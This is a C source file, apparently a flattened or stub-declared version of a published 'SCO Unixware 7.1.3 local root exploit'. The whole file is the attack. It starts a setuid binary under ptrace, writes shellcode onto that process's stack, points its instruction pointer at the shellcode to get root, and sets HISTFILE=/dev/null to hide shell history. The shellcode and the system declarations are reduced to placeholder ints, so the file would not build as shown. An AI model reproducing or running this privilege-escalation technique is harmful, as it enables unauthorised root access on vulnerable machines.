
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct user_regs_struct {long eip; int esp; } ;
typedef int pid_t ;


 int PTRACE_DETACH ;
 int PTRACE_GETREGS ;
 int PTRACE_POKETEXT ;
 int PTRACE_SETREGS ;
 int PTRACE_TRACEME ;
 int execle (char*,char*,int *,char**) ;
 int exit (int ) ;
 int fork () ;
 int getpid () ;
 int perror (char*) ;
 int printf (char*,...) ;
 int ptrace (int ,int ,int,...) ;
 int shellcode ;
 int strlen (int ) ;
 int usleep (int) ;
 int wait (int ) ;
 int waitpid (int ,int *,int ) ;

int main(int argc,char* argv[])
{
 int esp, eip, i = 0;
 struct user_regs_struct regs;
 char *env[] = {"HISTFILE=/dev/null",((void*)0)};
 pid_t pid;
 printf("[ SCO Unixware 7.1.3 local root exploit\n");
 if(argc < 2)
 {
  printf("[ Usage: [binary]\n");
  printf("[ e.g -rwsr-sr-x root root /linux/opt/kde2/bin/kcheckpass\n");
  exit(0);
 }
 switch (pid = fork())
 {
 case -1:
  perror("fork");
  break;
 case 0:
  ptrace(PTRACE_TRACEME, 0, 0, 0);
  pid = getpid();
  execle(argv[1],argv[1],((void*)0),env);
  break;
 default:
  waitpid(pid, ((void*)0), 0);
  ptrace(PTRACE_GETREGS, pid, ((void*)0), &regs);
  esp = eip = regs.esp - 512;
  while (i < strlen(shellcode))
  {
   ptrace(PTRACE_POKETEXT, pid, esp, (int) *(int *) (shellcode + i));
   i += 4;
   esp += 4;
  }
  regs.eip = (long) eip;
  printf("[ Using 0x%x\n",regs.eip);
  ptrace(PTRACE_SETREGS, pid, ((void*)0), &regs);
  ptrace(PTRACE_DETACH, pid, ((void*)0),((void*)0));
 }
 usleep(1);
 wait(0);
 return 0;
}
